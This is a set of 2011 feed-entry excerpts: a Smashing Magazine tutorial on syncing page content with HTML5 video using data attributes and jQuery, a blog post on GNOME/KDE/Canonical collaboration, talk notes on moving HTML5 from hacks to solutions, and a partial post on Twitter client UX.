</small></p></td></p></td></table></p>"

Instead of restricting user interaction to text, links, images and forms, HTML5 promotes multimedia, from a generic <code>&lt;object&gt;</code> element to a highly specified <code>&lt;video&gt;</code> and <code>&lt;audio&gt;</code> element, and with a rich API to access in pure JavaScript.</p><p>Native multimedia capability has a few benefits:</p><ul><li><strong>End users have full control over the multimedia.</strong><br> The native controls of browsers allow users to save videos locally or email them to friends. Also, HTML5 video and audio are keyboard-enabled by default, which is a great accessibility benefit.</li><li><strong>End users do not need to install a plug-in to play them.</strong><br> The browser already has everything it needs to play movies and sound.</li><li><strong>Video and audio content on the page can be manipulated.</strong><br> They are simply two new elements like any other that can be styled, moved, manipulated, stacked and rotated.</li><li><strong>You can build your own controls using HTML, CSS and JavaScript.</strong><br> No new skills or development environment needed.</li><li><strong>Interaction with the rest of the page is simple.</strong><br> The multimedia API gives you full control over the video, and you can make the video react both to changes in the video itself and to the page around it.</li></ul><p>Let’s quickly recap how you can use native video in the browser, starting with the embedding task.</p><h3>Embedding Video</h3><p>This is old news. Embedding video in a document is as easy as adding a <code>&lt;video&gt;</code> element and pointing it to the source video. Adding a <code>controls</code> attribute gives you native controls:</p><pre>\n&lt;video src=&quot;chris.ogv&quot; controls&gt;&lt;/video&gt;\n</pre><p>This is the theory, though. In the real world of intellectual property, corporate competition and device-specific solutions, we as developers have to jump through a few hoops:</p><pre>\n&lt;video controls=&quot;true&quot; height=&quot;295&quot; width=&quot;480&quot;&gt;\n  &lt;!-- hello iOS, Safari and IE9 --&gt;\n  &lt;source src=&quot;chris.mp4&quot; type=&quot;video/mp4&quot;&gt;\n  &lt;!-- Hello Chrome and Firefox (and Opera?) --&gt;\n  &lt;source src=&quot;chris.webm&quot; type=&quot;video/webm&quot;&gt;\n  &lt;!-- Hello Firefox and Opera --&gt;\n  &lt;source src=&quot;chris.ogv&quot; type=&quot;video/ogg&quot;&gt;\n  &lt;!-- Hello legacy --&gt;\n  Your browser does not support the video tag,\n  &lt;a href=&quot;http://www.youtube.com/watch?v=IhkUe_KryGY&quot;&gt;\n    check the video on YouTube\n  &lt;/a&gt;.\n&lt;/video&gt;\n</pre><p>This shows how we need to deliver video in three formats in order to satisfy all of the different browsers out there. There are a few ways to accomplish this. Here’s what I do…</p><h3>Convert Video With Miro Video Converter</h3><p><a href=\"http://www.mirovideoconverter.com/\">Miro Video Converter</a> is an open-source tool for Mac that makes converting videos dead easy. Simply drag the video to the tool, select WebM as the output format, and watch the progress. A few <a href=\"http://www.webmproject.org/tools/\">other converters for Windows and Linux</a> are available, too.</p><p><a href=\"http://www.mirovideoconverter.com/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/miro.png\" alt=\"Miro in Syncing Content With HTML5 Video\"></a></p><h3>Hosting And Automated Conversion On Archive.org</h3><p>Because I license my videos with <a href=\"http://creativecommons.org\">Creative Commons</a>, I can use <a href=\"http://archive.org\">Archive.org</a> to both host the videos and convert the WebM versions to MP4 and OGV. Simply upload your video and wait about an hour. Reload the page, and the server pixies at Archive.org will have created the other two formats (and also a cool animated GIF of your video).</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/archiveorg.png\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/archive-org.jpg\" width=\"550\" height=\"449\" alt=\"Archive-org in Syncing Content With HTML5 Video\"></a><br><em>You can use <a href=\"http://www.archive.org\">Archive.org</a> to both host the videos and convert the WebM versions to MP4 and OGV. <a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/archiveorg.png\">Large view</a>.</em></p><h3>Industrial-Strength Conversion With Vid.ly</h3><p>WebM, OGV and MP4 take care of only the major browsers, though. If you want to support all mobile devices, tablets and consoles and you want the video quality to adapt to the user’s connection speed, then you’ll have to create a few dozen versions of the same video. Encoding.com feels our pain and has released a free service called <a href=\"http://vid.ly\">Vid.ly</a>, which converts any video you upload into many different formats more or less in real time. Unfortunately, the service is in private beta at the moment, but you can use the invite code <code>HNY2011</code>.</p><p><a href=\"http://vid.ly\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/vid-ly.jpg\" width=\"550\" height=\"587\" alt=\"Vid-ly in Syncing Content With HTML5 Video\"></a><br><em><a href=\"http://vid.ly\">Vid.ly</a> converts any video you upload into many different formats more or less in real time. <a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/vidly.png\">Large view</a>.</em></p><p>Furthermore, Vid.ly creates a URL for your video that automatically redirects the browser or device calling it to the right format. This keeps your embed code as simple as possible:</p><pre>\n&lt;video src=&quot;http://vid.ly/4f3q1f?content=video&quot; controls&gt;&lt;/video&gt;\n</pre><p>Cool, isn’t it?</p><h3>The Power Of The HTML5 Video API: Syncing Content</h3><p>Now that our video is on the page, let’s check out the power of the API. Say, for example, you want to know what part of the movie is playing right now. This is as simple as subscribing to an event of the <code>&lt;video&gt;</code> element:</p><pre>\n&lt;div id=&quot;stage&quot;&gt;\n  &lt;video src=&quot;http://vid.ly/4f3q1f?content=video&quot; controls&gt;&lt;/video&gt;\n  &lt;div id=&quot;time&quot;&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;script&gt;\n  (function(){\n    var v = document.getElementsByTagName(&#39;video&#39;)[0]\n    var t = document.getElementById(&#39;time&#39;);\n    v.addEventListener(&#39;timeupdate&#39;,function(event){\n      t.innerHTML = v.currentTime;\n    },false);\n  })();\n&lt;/script&gt;\n</pre><p>If you <a href=\"http://isithackday.com/syncing-video/play.html\">try this out</a> in your browser, you will see the current time below the video when you play it.</p><p><a href=\"http://isithackday.com/syncing-video/play.html\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/time.png\" alt=\"Time in Syncing Content With HTML5 Video\"></a></p><p>You will also see that the <code>timeupdate</code> event gets fired a lot and at somewhat random times. If you want to use this to sync the showing and hiding of parts of the document, then you’ll need to throttle it somehow. The easiest way to do this is to <a href=\"http://isithackday.com/syncing-video/playfullsecond.html\">limit the number to full seconds</a> using <code>parseInt()</code>:</p><pre>\n&lt;div id=&quot;stage&quot;&gt;\n  &lt;video src=&quot;http://vid.ly/4f3q1f?content=video&quot; controls&gt;&lt;/video&gt;\n  &lt;div id=&quot;time&quot;&gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;script&gt;\n  (function(){\n    var v = document.getElementsByTagName(&#39;video&#39;)[0]\n    var t = document.getElementById(&#39;time&#39;);\n    v.addEventListener(&#39;timeupdate&#39;,function(event){\n      t.innerHTML = parseInt(v.currentTime) + &#39; - &#39; + v.currentTime;\n    },false);\n  })();\n&lt;/script&gt;\n</pre><p><a href=\"http://isithackday.com/syncing-video/playfullsecond.html\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/timesecond.png\" alt=\"Timesecond in Syncing Content With HTML5 Video\"></a></p><p>You can use this to trigger functionality at certain times. For example, you can sync an <a href=\"http://isithackday.com/spirit-of-indiana/\">Indiana Jones-style animation of a map to a video</a>:</p><p><iframe title=\"YouTube video player\" width=\"480\" height=\"390\" src=\"http://www.youtube.com/embed/KNNzP6fyOyQ?rel=0\" frameborder=\"0\"></iframe></p><p>For a full explanation of this demo, check out the <a href=\"http://hacks.mozilla.org/2010/12/spirit-of-indiana-jones-syncing-html5-video-with-maps/\">blog post on Mozilla Hacks</a>.</p><p>Let’s have a go at something similar: a video that shows the content from web pages being referred to by a presenter. Check out <a href=\"http://isithackday.com/syncing-video/\">this video demo of me explaining what we’re doing here</a>, with the content appearing and disappearing at certain times in the video. Make sure to jump around the video with the controls.</p><p><a href=\"http://isithackday.com/syncing-video/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/syncing.jpg\" width=\"550\" height=\"316\" alt=\"Syncing in Syncing Content With HTML5 Video\"></a></p><p>We’ve already covered how to get the current time of a video in seconds. What I want now is to display and hide a few parts of the website at certain times in the video. If video is not supported in the browser, then I would just <a href=\"http://isithackday.com/syncing-video/allarticles.html\">show all of the content without any syncing</a>.</p><p>The first issue I have to solve is to allow the maintainer to control what is shown when. Normally, I’d use a JSON object in the JavaScript, but I figure that keeping the maintenance in the markup itself makes much more sense.</p><p>HTML5 allows you to store information in <code>data-</code> attributes. So, to make it easy to tell the script when to show what, I just use <code>data-start</code> and <code>data-end</code> attributes, which define the time frames for the articles that I want to sync with the video:</p><pre>&lt;article data-start=&quot;64&quot; data-end=&quot;108&quot;&gt;\n  &lt;header&gt;&lt;h1&gt;Archive.org for conversion&lt;/h1&gt;&lt;/header&gt;\n  &lt;p&gt;&lt;a href=&quot;http://archive.org&quot;&gt;Archive.org&lt;/a&gt; is a website dedicated to\narchiving the Internet. For content released as under a Creative Commons\nlicense, it offers hosting for video and audio and automatically converts the\ncontent to MP4 and Ogg video for you.&lt;/p&gt;\n  &lt;iframe src=&quot;http://archive.org&quot;&gt;&lt;/iframe&gt;\n&lt;/article&gt;</pre><p>You can try it out by <a href=\"https://github.com/codepo8/Syncing-Video\">downloading the code</a> and changing the values yourself (or use Firebug or the Web Inspector to change it on the fly).</p><p>Here’s the script (using jQuery) that makes this happen:</p><pre>\n/* if the document is ready… */\n$(document).ready(function(){\n\n/* if HTML5 video is supported */\n  if($(&#39;video&#39;).attr(&#39;canPlayType&#39;)){\n\n    $(&#39;aside::first&#39;).append(&#39;&lt;p&gt;Play the video above and see how &#39; +\n                             &#39;the different connected content sections &#39; +\n                             &#39;in the page appear at the right moment. &#39;+\n                             &#39;Feel free to jump forward and backward&lt;/p&gt;&#39;);\n\n    var timestamps = [],\n        last = 0,\n        all = 0,\n        now = 0,\n        old = 0,\n        i=0;\n\n/* hide all articles via CSS */\n    $(&#39;html&#39;).addClass(&#39;js&#39;);\n\n/*\n   Loop over the articles, read the timestamp start and end and store\n   them in an array\n*/\n    $(&#39;article&#39;).each(function(o){\n      if($(this).attr(&#39;data-start&#39;)){\n        timestamps.push({\n          start : +$(this).attr(&#39;data-start&#39;),\n          end : +$(this).attr(&#39;data-end&#39;),\n          elm : $(this)\n        });\n      }\n    });\n\n    all = timestamps.length;\n\n/*\n  when the video is playing, round up the time to seconds and call the\n  showsection function continuously\n*/\n    $(&#39;video&#39;).bind(&#39;timeupdate&#39;,function(event){\n      now = parseInt(this.currentTime);\n\n      /* throttle function calls to full seconds */\n      if(now &gt; old){\n        showsection(now);\n      }\n      old = now;\n\n    });\n\n/*\n  Test whether the current time is within the range of any of the\n  defined timestamps and show the appropriate section.\n  Hide all others.\n*/\n    function showsection(t){\n      for(i=0;i&lt;all;i++){\n        if(t &gt;= timestamps[i].start &amp;&amp; t &lt;= timestamps[i].end){\n          timestamps[i].elm.addClass(&#39;current&#39;);\n        } else {\n          timestamps[i].elm.removeClass(&#39;current&#39;);\n        }\n      }\n    };\n\n  };\n});</pre><p>So, what’s going on here? First, we’re checking whether the browser is capable of playing HTML5 video by testing for the <code>canPlayType</code> attribute. If all is fine, then we add some explanatory text to the document (which wouldn’t make sense if the browser couldn’t show a video). Then, we define some variables to use and add a class of <code>js</code> to the root element of the document. This, together with the <code>.js article</code> selector in the CSS, hides all of the articles in the document.</p><p>We then loop through the articles, read out the timestamps for the start and end of each of the sections and store them in an array called <code>timestamps</code>.</p><p>We then subscribe to the <code>timeupdate</code> event, rounded up to full seconds, and call the <code>showsection()</code> function every new second.</p><p>The <code>showsection()</code> function loops through all of the timestamps and tests whether the current time of the video is in the range of one of the articles. If it is, then that article is displayed (by adding a <code>current</code> class) and all the others are hidden. This could be optimized by storing the current section and removing the class from only that element.</p><h3>Can We Do The Same With Less Or No Code?</h3><p>If you like the idea of syncing content and video, check out the <a href=\"http://popcornjs.org/\">Popcorn framework</a>, which is based on the same techniques but gives you much more control over the video itself.</p><p><a href=\"http://popcornjs.org/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/popcorn.gif\" width=\"550\" height=\"605\" alt=\"Popcorn in Syncing Content With HTML5 Video\"></a></p><p><a href=\"http://popcornjs.org/butter/\">Butter</a> is a point-and-click interface to go on top of Popcorn. It has a nice timeline editor that allows you to play a video and show all kinds of Web content at certain times. You can export and send your creations to friends, too.</p><p><a href=\"http://popcornjs.org/butter/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/butter.jpg\" width=\"550\" height=\"380\" alt=\"Butter in Syncing Content With HTML5 Video\"></a><br><em><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/02/butter.png\">Large view</a></em></p><p>With systems like Popcorn and Butter, we are one step closer to having authoring tools for the rich interactions that HTML5 offers us. What can you think of building?</p><h3>Summary</h3><p>Today we looked at how to embed video onto a Web document; and with the native video API that gives us event handlers for changes in a video, we saw how easy it is to make the video interact with the rest of the document. Instead of trying to control the video, we use native controls to make the page react to what is happening in the video itself. We used semantic HTML and data attributes to allow maintainers to use the syncing script without having to touch any JavaScript, and we looked at some services that make hosting and converting video easy.</p><p>All of these cool technologies give us a lot of power, but we can’t just, say, write some simple CSS, JavaScript and HTML to use them. If we want open technologies to succeed, then we have to make them easy for people to use. The next step now is to move from the “one-off implementation” phase and think about creating tools and step-by-step code-creation systems for users who want to use these cool new technologies but don’t want to spend much time and effort doing it.</p><p>With native audio and video in browsers, we’ve taken a massive step toward make the open Web more engaging and beautiful. The next step will be to use multimedia not only for output but for input. A lot of hardware these days comes with cameras and microphones; we need to start using and supporting open technology that allows our users to take advantage of this hardware to interact with our Web products.</p><p><em>For a screencast on this topic, see <a href=\"http://hacks.mozilla.org/2011/03/syncing-page-content-with-html5-video/\">Syncing page content with HTML5 video</a> on the Mozilla Hacks blog.</em></p><p><em>(al)</em></p><p> <br> </p><hr><p><small>© Christian Heilmann for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2011. | <a href=\"http://www.smashingmagazine.com/2011/03/11/syncing-content-with-html5-video/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2011/03/11/syncing-content-with-html5-video/#comments\">Post a comment</a> | <a href=\"http://shop.smashingmagazine.com/\" title=\"Smashing Shop\">Smashing Shop</a> | <a href=\"http://www.smashingmagazine.com/the-smashing-network/\" title=\"Smashing Network\">Smashing Network</a> | <a href=\"http://www.smashingmagazine.com/about/\" title=\"About Us\">About Us</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/html5/\" rel=\"tag\">html5</a>, <a href=\"http://www.smashingmagazine.com/tag/video/\" rel=\"tag\">video</a><br> </small></p>"

      "content" : "<p>There is currently quite stern discussion going on between <a href=\"http://blogs.gnome.org/bolsh/2011/03/07/has-gnome-rejected-canonical-help/\">GNOME</a>, <a href=\"http://www.markshuttleworth.com/archives/654\">Canonical</a> and <a href=\"http://aseigo.blogspot.com/2011/03/collaborations-demise.html\">KDE</a> about collaboration on the free desktop. Angry words have been written, and I believe much of the tension arises from the situation with MeeGo. Suddenly many developers and projects feel much more marginalized than what the future looked like, <a href=\"http://bethesignal.org/blog/2011/02/11/elopocalypse-nokia-chooses-microsoft/\">pre-112</a>. Hopefully cooler heads will prevail before the <a href=\"https://www.desktopsummit.org/\">Desktop Summit</a>, and we can again have beers and discuss things together.</p>\n<p>Cross-project collaboration is hard. I know. For many years I've been pushing for <a href=\"http://bergie.iki.fi/blog/geoclue_0-12_is_out-location_awareness_over_d-bus/\">location-awareness</a> across desktops, for <a href=\"http://bergie.iki.fi/blog/why_you_should_use_a_content_repository_for_your_application/\">using shared content repositories</a> instead of application-specific file formats or databases, and most recently for having a common client-side <a href=\"http://bergie.iki.fi/blog/decoupling_content_management/\">data representation and manipulation layer</a> on content management systems. Some of these ideas have moved forward. Some others, less so.</p>\n<p>What is important to remember is that each project has their own use cases, user experience goals and set of selected technologies to build on. If a collaborative approach you propose doesn't fit those, it is highly unlikely that the project will adopt it. And there is nothing wrong with that.</p>\n<p>Instead of looking at the failures, we should think of the ways cross-desktop collaboration has moved forward. Here are some examples:</p>\n<ul><li><a href=\"http://www.freedesktop.org/wiki/Software/dbus\">D-Bus</a> is pretty much everywhere now. A common way to handle signalling and API calls between processes is a big step</li>\n<li><a href=\"http://telepathy.freedesktop.org/wiki/\">Telepathy</a> provides a great real-time communications system on all desktops</li>\n<li>All projects seem a lot more UX-focused nowadays. Great examples are <a href=\"http://afaikblog.wordpress.com/2011/03/01/where-did-the-buttons-go/\">window management</a> in GNOME Shell, <a href=\"http://techbase.kde.org/Projects/Silk\">web integration</a> in KDE, and better handling of <a href=\"http://design.canonical.com/2011/03/quit/\">quitting applications</a> and <a href=\"http://design.canonical.com/2011/03/introducing-overlay-scrollbars-in-unity/\">scrolling in them</a> in Unity. These ideas are easy to transfer between projects</li>\n<li>There is work ongoing on <a href=\"http://blogs.gnome.org/hughsie/2011/01/24/application-installer-miniconf-trip-report/\">unifying application installers</a> between distributions. <a href=\"http://www.freedesktop.org/wiki/Specifications/open-collaboration-services\">Open Collaboration Services</a> is also useful here</li>\n<li><a href=\"http://wayland.freedesktop.org/\">Wayland</a> shows great promise for simplifying the graphics layer on Linux desktops</li>\n</ul><p>So, if you want to get a specification accepted between projects, how to go about it?</p>\n<p>First of all, you should communicate early and clearly the use cases your specification aims for. And then there should be a reference implementation available, not only as a library, but also as something already integrated in your UX.</p>\n<p>If you want projects to actually use your reference implementation instead of building their own, then it is important to remove as many obstacles from adopting it as possible:</p>\n<ul><li>Use permissive licensing and try to avoid copyright assignments or other requirements potential users would find onerous</li>\n<li>Host the project <a href=\"http://bergie.iki.fi/blog/why_make_your_projects_properly_open-sustainability/\">on neutral ground</a>. For web projects, Apache is quite a good home. For desktop projects, Freedesktop is probably the best option</li>\n<li>Use technologies that don't impose too many constraints. Libraries should be quite low-level, or provide D-Bus APIs that can be used with any system</li>\n<li>Avoid technology-specific dependencies. For example, KDE has found <a href=\"http://freedesktop.org/wiki/Software/GeoClue\">GeoClue</a> hard to adopt because it uses GNOME-specific settings interfaces</li>\n<li>Talk with the other guys. If you're from the GNOME project, go to aKademy and give a talk, and if you're a KDE developer, go and talk in GUADEC. IRC isn't bad here either</li>\n<li>Finally, accept that not everybody will use your implementation. But if they at least implement the same ideas, then collaboration is still possible.</li>\n</ul><p>And even if your ideas haven't been adopted by other projects, as long as your implementation solves the use case for you it hasn't been in vain. After all, delivering software, and delivering great user experience is what counts.</p>"

Here are the slides, notes and an audio recording of the talk.</p>\n\n\t<p><h2>Slides</h2></p>\n\n\t<p></p>\n\n\t<p><h2>Audio recording</h2></p>\n\n\t<p><audio controls style=\"display:block;margin:1em\"><source src=\"http://www.archive.org/download/Html5-MovingFromHacksToSolutions/MovingFromHacksToSolutions.mp3\" type=\"audio/mp3\"><source src=\"http://www.archive.org/download/Html5-MovingFromHacksToSolutions/MovingFromHacksToSolutions.ogg\" type=\"audio/ogg\"></audio></p>\n\n\t<p><h2>Notes</h2></p>\n\n\t<p><p>Today, we’ll talk about <span>HTML5 </span>- moving from hacks to solutions. This is a topic that I’ve covered a lot lately but funnily enough – I am not getting tired of it.</p></p>\n\n\t<p><h3>We work in new media!</h3></p>\n\n\t<p><p>The reason is that I’ve seen the worst of the web and I see <span>HTML5</span> as a chance to make us move forward in our evolution of the internet as the media that works, is available for everyone and makes us more efficient rather than turning us into couch potatoes and forget our day to day worries in exchange to watching artificial people live the life we would love to have.</p></p>\n\n\t<p><h3>Oh, Canada!</h3></p>\n\n\t<p><p>First of all, it is good to be back in Canada – I like Canada a lot, Wolverine is from here and all the people I met so far in our small world are amazingly crafty developers. </p></p>\n\n\t<p><h3><span>HTML5</span> is tech evolution in action</h3></p>\n\n\t<p><p>So what is all that <span>HTML5</span> stuff about? To me, it is about moving forward and letting go of ideas we consider to be the best solution but really only use because we are familiar with them. Better the devil you know, right?</p></p>\n\n\t<p><h3>A much more flexible internet experience</h3></p>\n\n\t<p><p>I think as developers we owe it to the world to build a better internet experience. Computers are very versatile things and connectivity allows us to keep things up-to-date, react to change and access systems on-demand rather than having all of them hoarded somewhere.</p></p>\n\n\t<p><h3>When did we stop dreaming of awesome computers?</h3></p>\n\n\t<p><p>If you look at the movies of the last few decades you will find that we more and more moved away from computers of awesome that react to voice recognition and have unlimited potential to product placements of the currently newest smartphone or system. The same seems to happen to the web – a lot of people already see the web as boring interlinked texts and web sites that don’t help you fulfil a task. Instead people see small apps for smartphones, tablets and other mobile systems as the future. I think the web as a concept is big and clever enough to allow for both.</p></p>\n\n\t<p><h3>Uprading is a good thing</h3></p>\n\n\t<p><p>Not many people complain when they get upgrades in real life. A better seat on the plane is a nice thing to have. A faster computer makes you work better as you don’t have to wait for the bloody thing to load and finish the tasks you have to achieve using it. </p></p>\n\n\t<p><h3>Staying in the comfort zone</h3></p>\n\n\t<p><p>When it comes to web technology though, you find a lot of people who are unhappy about change and don’t trust <span>HTML5</span> and related technologies yet. Change can be a scary thing – especially when you’ve been disappointed in the past. It is tricky to trust browsers to do things right for us and it is very tempting to stick with what we know and say this is all we have – this is how good the web can be.</p></p>\n\n\t<p><h3>Still waiting for the closed technology revolution</h3></p>\n\n\t<p><p>Over my career I’ve seen many attempts to make the web a better and richer experience. A lot of plugins came and went. Java applets, <span>VRML</span>, Real Player, Quicktime, iPix, Shockwave and many more promised to make a browser more interesting and a richer experience. Flash and with it Air and Flex went furthest out with it and their success and adoption rate shows that we need a richer web. However, pure Flash solutions are still a rarity on the web. When it comes to complex forms, huge data systems and web based applications you are more likely to find hybrids or slow and annoying server-driven systems than slick Flash interfaces. </p></p>\n\n\t<p><h3>Starting the open technology revolution</h3></p>\n\n\t<p><p>The great thing about <span>HTML5</span> as an idea is that we don’t ask people to buy software or understand and start to trust new technology – instead we innovate on already existing necessary infrastructure. You use a browser to surf the web – all we have to make people do is upgrade their browser. And as everything is open there is no ambiguity as to where things are going in the future – instead of making people wait for upgrades their requests and needs drive them.</p></p>\n\n\t<p><h3>A few steps towards a better web</h3></p>\n\n\t<p><p>We have the technology and we have the ideas to make the web much, much better. What we need to do is think the right way.</p></p>\n\n\t<p><h4>Step one: stop thinking in limits</h4></p>\n\n\t<p><p>If we want the web as it is now – easy to access, open for everyone and simple to upgrade – to survive we have to stop thinking in a limited way. Web sites do not have to be multiple columns of text or follow the same principles as print design does (plain psychology and aesthetics for humans are a barrier to this, but shift can happen). Web sites can be applications that break the concept of a text document. Web sites can be independent of the size of the browser viewport – either by adapting and showing more or less according to how much space is available or by just telling the user they can move in any direction.</p></p>\n\n\t<p><h4>Step two: use what the client offers</h4></p>\n\n\t<p><p>It is time we thank the browser vendors for supporting new technologies by using them. We’re right now in a Catch-22 situation were some people want browsers to support tech but the companies making browsers don’t add them yet as there is no demand. Time to break this cycle. Go on then, use local storage to make your interfaces much simpler by storing some of the information. Take a look at offline storage – not only for mobile interfaces. Play with geolocation to tell a user where they are or to prefill forms. Use native video and audio instead of yet another Flash movie. Use Canvas and <span>SVG</span> for charting and a fallback image linking to a browser upgrade page. Play with touch events and even with device orientation. A lot more than you think is already possible and can be used once you put it in a simple if statement.</p></p>\n\n\t<p><h4>Step three: increase your vocabulary</h4></p>\n\n\t<p><p>Communication is about vocabulary. Sure, you can make sense with a few simple words and a set of simple instructions but to make a sentence engage and spark the theatre in the head of the reader or listener you need to be able to play with language and the more pieces you have the nicer the mosaic will get. On the web we right now grunt and point when it comes to speaking to browsers. The old <span>HTML</span> vocabulary has become an anachronism hailing back to the times where all we had to do is mark up academic papers. Forms especially were too simple in what we needed to do with them to build enjoyable interfaces. In order to make the browsers do the things our apps natively should do we need more, intelligent <span>HTML</span> elements. The <span>HTML5</span> spec is a step in the right direction, and we should use these wonderful new constructs to tell a better story. Non-meaningful DIVs should be replaced with <span>SECTION</span>, ASIDE or <span>ARTICLE</span>, form elements should not be a type of text but a phone number, a <span>URL</span>, a number or even an email. All of these words are at our disposal, but we don’t use them in day to day conversation yet which is why there is not much happening in terms of support. We should not be the translator for <span>HTML</span> to the browser – this can only lead to telephone-esque misunderstandings.</p></p>\n\n\t<p><h4>Step four: allow technology to retire</h4></p>\n\n\t<p>This is a tricky topic right now. A lot of <span>HTML5</span> is not being used as there are old and outdated browsers still in use and for reasons beyond our control are not being upgraded. Here’s an idea: let’s allow old and tired browsers to retire. Let’s give them a working version of our web site that is plain <span>HTML</span> with reloads and the content available and let’s concentrate our efforts in supporting the web that is around the corner and needs us to become mainstream. Yes, we can simulate almost all of the new things in <span>HTML5</span> for legacy browsers, but if we do that we also need to test on them to see that everything works smoothly. We should not spend our time testing for old browsers when there is new stuff to be tested. There is nothing wrong with delivering an old school experience to old technology and increase the enjoyment when and if the environment allows for it.</p>\n\n\t<p><h4>Step five: build systems that automate annoying tasks</h4></p>\n\n\t<p>Of course there are some annoyances in <span>HTML5 </span>- it is a young technology. The biggest issues however are not technical issues but licensing and IP related problems. For example to embed a video as <span>HTML5</span> you have to provide it in three different formats to cover all browsers. That’s why we need to make it easy for people to make the switch. Vid.ly for example is a service that converts videos in dozens of formats and redirects the client in use to the correct format automatically. This is what we should thrive for – find issues and build systems to work around them – this is how money is made.</p>\n\n\t<p><h4>Step six: build tools that help others build with new technology</h4></p>\n\n\t<p>We have specs for the technologies and examples how to use them. We can, however, not expect everybody to be as excited about the things we are getting high on right now. We can also not expect everybody who builds things for the web or writes content for it to write everything by hand. The editors we use right now do not create <span>HTML5 </span>- most actually create <span>XHTML</span> instead. We now need to ask the companies who say <span>HTML5</span> is the future to build systems that allow maintainers of the web to build it. One cool example of that is <a href=\"http://butterapp.org\">Butter</a> which is a visual interface on top of the <a href=\"http://popcornjs.org/\">Popcorn</a> JavaScript framework that allows you to build interactive presentations with <span>HTML5</span> video. <a href=\"http://www.aviary.com/html5editor\">Aviary</a> have an online image editor that uses <span>HTML5</span> and the <a href=\"http://www.aloha-editor.org\">Aloha Editor</a> is an <span>HTML5</span> wysiwyg editor for <span>CMS</span>. We need more of that.</p>\n\n\t<p><h4>Step seven: be part of the discussion</h4></p>\n\n\t<p>Last but not least we need you to take part in the conversation around <span>HTML5</span>. If you stay out of it, you can’t complain about mistakes being made – all the processes are open and you can be part of the mailing list. It is not a popularity contents – sure, known people working in big companies are very likely to come up with good ideas, but anyone can have those and sometimes it is important not to look at an issue from a professional day-to-day perspective but see what people really need to have fixed. We need you to listen to what people are saying and validate it from your point of view. The earlier mistakes can be spotted, the easier they are to avoid. As we are dealing with open technology, there are no secrets and there shouldn’t be a reason for people not answering your questions. It is also important to look out for upcoming problems that are not yet in the specifications. Right now for example this would be the device <span>API</span> which will allow you to use cameras and microphones as input devices.</p>\n <p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/05g37okck9ig2gsd876j5of8bk/300/250?ca=1&amp;fh=280#http%3A%2F%2Fwww.wait-till-i.com%2F2011%2F03%2F14%2Fhtml5-moving-from-hacks-to-solutions-my-talk-at-confoo-in-montreal%2F\" width=\"100%\" height=\"280\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><img src=\"http://feeds.feedburner.com/~r/chrisheilmann/~4/OD-bZPM1I_w\" height=\"1\" width=\"1\">"

The new version has a ton of great features, such as autocompletion of @usernames and hashtags, better photo uploading, and some UI cleanup. This has all been over shadowed by the addition of a “trending topics” bar that appears at the top of your view.</p>\n<p>I am sure that some users love the feature (the quiet ones) but a vocal community quickly came about and:</p>\n<ul>\n<li>a) complained\n<li>b) reverted to 3.2 or even to try other clients (e.g. Echofon)\n<li>c) built and installed software to “fix” the issue (e.g. <a href=\"http://www.funkyspacemonkey.com/twizzler-remove-trends-bar-twitter-33\">Twizzler</a>).\n</li></li></li></ul>\n<p>Those who are vocal wanted a way to turn this off. An option. Even if it is buried in the settings (a few taps into the app).</p>\n<p>To this, Dick Costello (CEO) <a href=\"http://twitter.com/#!/dickc/status/44221580028547072\">responded</a>:</p>\n<p><a href=\"http://twitter.com/#!/dickc/status/44221580028547072\"><img src=\"http://almaer.com/blog/uploads/dickcquote.png\" alt=\"dickcquote\" title=\"dickcquote\" width=\"525\"></a></p>\n<p>This is very interesting, and where we can learn. I have found that one key art in software development is when and how to abstract your code. I have seen developers go down a common path:</p>\n<ul>\n<li>Phase 1) Minimal abstractions. Spaghetti code ensues. Everything is coupled to everything else\n<li>Phase 2) Crazy abstractions. Ravioli code ensures. Everything is wrapped as one method with an abstract class and an Interface (picking on Java here!)\n<li>Phase 3) The balance. Working hard to make the right balance, enabling readable and modular code without losing the ability to see how it all fits together.\n</li></li></li></ul>\n<p><em>ASIDE: I tend to enjoy the like of Ruby (and even JavaScript and CoffeeScript) as I always feel like every line of code is doing something.</em></p>\n<p>There is a similar balance in the world of UX. You want to offer just enough knobs and switches to get people working in a beautiful way, but not too many (so they can’t work out how to do a darn thing [e.g. original desktop linux days]) or too few (so they feel like they can’t get anything done!).</p>\n<p>I find it fascinating to watch this balance. As a power user, I find it interesting to know what I personally want to be able to tweak about a system. For example, going back to Twitter. I switched to Echofon from Tweetie back in the day. I loved much about it:</p>\n<ul>\n<li>The way that you click on something and a gutter shows you more, but you don’t lose your context\n<li>It was an early consumer of the streaming API so data showed up sharply\n<li>It showed when people interacted with my tweets (other RT, favorites, etc).\n</li></li></li></ul>\n<p>One feature that people will scoff at as minor, is the fact that it has no way to display the real name of the tweet author, and instead I am stuck with a username. Now, I happen to have a bunch of folk who I follow who have fun handles. However, I don’t have the full mental map to remember that @monkeyape23 is my old mate Bob from England. I just want to see his name. Please. This silly little feature lead me away from Echofon believe it or not (please add it guys!).</p>\n<p>I liken my Twitter client to my Email client. Some people love their stock Gmail/Mail.app/Outlook experience, but many very much like to tweak it. Some may want a three-pane view (I use “Multiple inboxes” on Gmail for this), some want to change the number of lines in the preview, and others trick the hell out of their system with scripts and extensions. You are in this software daily, and some folks like to 